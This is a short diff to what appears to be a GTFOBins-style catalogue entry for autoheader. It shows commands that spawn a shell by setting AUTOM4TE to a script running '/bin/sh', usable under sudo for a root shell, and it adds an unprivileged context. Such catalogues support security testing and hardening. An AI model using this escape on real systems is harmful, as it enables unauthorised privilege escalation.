@@ -2,11 +2,11 @@
 functions:
   shell:
   - code: |-
-      cd /path/to/temp-dir
+      echo '/bin/sh 1>&0' >/path/to/temp-file
+      chmod +x /path/to/temp-file
       touch configure.ac
-      echo '/bin/sh' > sh
-      chmod +x sh
-      AUTOM4TE='/path/to/temp-dir/sh' autoheader
+      AUTOM4TE=/path/to/temp-file autoheader
     contexts:
       sudo:
+      unprivileged:
 ...
